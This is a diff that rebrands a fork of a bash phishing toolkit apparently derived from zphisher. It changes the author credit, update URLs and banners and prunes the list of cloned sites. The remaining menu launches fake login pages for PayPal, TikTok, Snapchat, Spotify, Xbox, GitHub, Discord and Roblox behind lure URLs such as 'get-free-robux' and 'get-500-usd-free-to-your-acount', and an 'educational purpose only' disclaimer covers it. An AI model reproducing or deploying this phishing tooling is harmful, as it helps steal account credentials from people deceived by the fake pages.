@@ -76,7 +76,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2022  RENDER (https://github.com/render437)
 ##
 
 ##   THANKS TO :
@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/render437/render.phisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/render437/render.phisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -203,17 +203,17 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE}                    _                   _     _     _               
+		${ORANGE}				    | |                 | |   (_)   | |              
+		${ORANGE} _ __ ___ _ __   __| | ___ _ __   _ __ | |__  _ ___| |__   ___ _ __ 
+		${ORANGE}| '__/ _ \ '_ \ / _` |/ _ \ '__| | '_ \| '_ \| / __| '_ \ / _ \ '__|
+		${ORANGE}| | |  __/ | | | (_| |  __/ |    | |_) | | | | \__ \ | | |  __/ |   
+		${ORANGE}|_|  \___|_| |_|\__,_|\___|_|    | .__/|_| |_|_|___/_| |_|\___|_|   
+		${ORANGE}                                 | |                                
+		${ORANGE}                                 |_|   ${RED}Version : ${__version__}  
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by render (tahmid.rayat)${WHITE}
 	EOF
 }
 
@@ -221,9 +221,11 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░░░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${BLUE}░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${BLUE}░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}
+		${BLUE}
 	EOF
 }
 
@@ -349,20 +351,15 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Author   ${RED}:  ${ORANGE}RENDER ${RED}
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/render437
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
 		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
-		  any misuse of this toolkit ${RED}!${WHITE}
+		  any misuse of this tool ${RED}!${WHITE}
 		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -707,32 +704,6 @@ site_gmail() {
 	esac
 }
 
-## Vk
-site_vk() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="vk"
-			mask='https://vk-premium-real-method-2020'
-			tunnel_menu;;
-		2 | 02)
-			website="vk_poll"
-			mask='https://vote-for-the-best-social-media'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_vk; };;
-	esac
-}
-
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
@@ -770,124 +741,34 @@ main_menu() {
 			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
 		5 | 05)
-			website="netflix"
-			mask='https://upgrade-your-netflix-plan-free'
-			tunnel_menu;;
-		6 | 06)
 			website="paypal"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		7 | 07)
-			website="steam"
-			mask='https://steam-500-usd-gift-card-free'
-			tunnel_menu;;
-		8 | 08)
-			website="twitter"
-			mask='https://get-blue-badge-on-twitter-free'
-			tunnel_menu;;
-		9 | 09)
-			website="playstation"
-			mask='https://playstation-500-usd-gift-card-free'
-			tunnel_menu;;
-		10)
+		6 | 06)
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
-		11)
-			website="twitch"
-			mask='https://unlimited-twitch-tv-user-for-free'
-			tunnel_menu;;
-		12)
-			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
-			tunnel_menu;;
-		13)
+		7 | 07)
 			website="snapchat"
 			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-		14)
-			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
-			tunnel_menu;;
-		15)
-			website="ebay"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		16)
-			website="quora"
-			mask='https://quora-premium-for-free'
-			tunnel_menu;;
-		17)
-			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
-			tunnel_menu;;
-		18)
+		8 | 08)
 			website="spotify"
 			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
-		19)
-			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
-			tunnel_menu;;
-		20)
-			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
-			tunnel_menu;;
-		21)
-			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		22)
-			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		23)
-			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		24)
-			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
-			tunnel_menu;;
-		25)
-			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
-			tunnel_menu;;
-		26)
-			website="wordpress"
-			mask='https://unlimited-wordpress-traffic-free'
-			tunnel_menu;;
-		27)
-			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
-			tunnel_menu;;
-		28)
-			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
-			tunnel_menu;;
-		29)
-			site_vk;;
-		30)
+		9 | 09)
 			website="xbox"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		31)
-			website="mediafire"
-			mask='https://get-1TB-on-mediafire-free'
-			tunnel_menu;;
-		32)
-			website="gitlab"
-			mask='https://get-1k-followers-on-gitlab-free'
-			tunnel_menu;;
-		33)
+		10)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
-		34)
+		11)
 			website="discord"
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
-		35)
+		12)
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
